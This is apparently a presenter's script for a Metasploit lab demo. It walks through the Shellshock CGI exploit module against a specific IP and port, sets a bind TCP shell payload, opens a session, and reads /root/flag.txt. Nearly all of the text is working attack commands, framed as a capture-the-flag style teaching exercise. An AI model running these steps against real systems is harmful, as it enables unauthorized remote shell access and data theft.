#Metasploit Lab

### Step-by-Step Command Flow

**1. Launch Metasploit and Select Exploit**
```bash
msfconsole
use exploit/multi/http/apache_mod_cgi_bash_env_exec
```

**2. Configure the Target (The "Setup" Phase)**
```bash
set RHOSTS 44.220.130.181
set RPORT 8080
set TARGETURI /cgi-bin/vulnerable
```

**3. Set Payload and Verify (Crucial for a clean demo)**

```bash
set PAYLOAD linux/x86/shell/bind_tcp
show options
```

**4. Execute and Interact**
```bash
exploit
```
*(Once you see the `Command shell session 1 opened` message, tell them: "We are now inside the target server.")*

**5. Post-Exploitation (The "Hack")**
* "Now that we have a shell, let's look around and find the hidden flag."*
```bash
whoami
cat /root/flag.txt
```

---
